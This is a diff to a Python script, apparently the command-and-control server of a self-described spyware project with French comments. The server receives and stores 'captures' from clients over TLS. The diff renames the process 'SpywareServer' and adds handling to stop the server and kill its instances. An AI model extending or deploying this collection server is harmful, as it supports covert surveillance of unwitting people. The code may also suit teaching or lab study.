@@ -7,6 +7,9 @@ import os
 from pathlib import Path
 from threading import Thread
 import ssl
+import signal
+import psutil
+import setproctitle
 
 # Arguments 
 
@@ -53,6 +56,8 @@ def display_files():
     if files == []:
         print("No files captured yet")
 
+
+
 def read_file(filename):
 
     try :
@@ -64,16 +69,57 @@ def read_file(filename):
         print(f"File '{filename}' not found in the 'captures' folder.")
         display_files()
 
+
+
+def get_server_instances():
+    procs = []
+
+    for proc in psutil.process_iter():
+        if "SpywareServer" == proc.name():
+            procs.append(proc.pid)
+
+    return procs
+
+
+
+def stop_server(signal=None, frame=None):
+
+
+    data = ssl_socket.recv(1024).decode('utf-8')
+
+    # si des données ont été réceptionnées
+    if data:
+        handle_data(data, addr)
+
+        print("send stop code")
+        ssl_socket.send("STOP".encode("utf-8"))
+
+        # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
+        time.sleep(1)
+
+    ssl_socket.close()
+    server_socket.close()
+
+    print(f"stoping server. host : {host}")
+    
+    exit()
+
+
 # Traitement
 
+
 if args.listen:
+
+    setproctitle.setproctitle("SpywareServer")
+
+    signal.signal(signal.SIGTERM, stop_server)
+    
     # Configuration du socket
     host = '172.16.120.1'
     port = args.listen
 
     # crétaion et configuration du socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     server_socket.bind((host, port))
     server_socket.listen()
 
@@ -114,14 +160,6 @@ if args.listen:
                     print("[+] Keep running")
                     ssl_socket.send("OK".encode("utf-8"))
 
-                else:
-                    print("send stop code")
-                    ssl_socket.send("STOP".encode("utf-8"))
-                    running = False
-
-                    # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
-                    time.sleep(1)
-
 
         # interception du KeyboardInterrupt
         except KeyboardInterrupt as e:
@@ -142,7 +180,7 @@ if args.listen:
                 # arrêter le serveur
                 print("[+] Le serveur va s'arrêter")
 
-                return_code = "STOP"
+                stop_server()
 
 
         except Exception as e:
@@ -155,10 +193,10 @@ if args.listen:
     server_socket.close()
 
 
+
 elif args.show:
     display_files()
     sys.exit()
-
 
 
 
@@ -170,6 +208,17 @@ elif args.readfile:
 
 elif args.kill:
     print("kill all the instances")
+
+    procs = get_server_instances()
+
+    print(f"{len(procs)} instances found")
+
+    for proc in procs:
+        try:
+            os.kill(proc, signal.SIGTERM)
+
+        except Exception as e:
+            print(f"Error while killing servers : {e}")
 
 
 
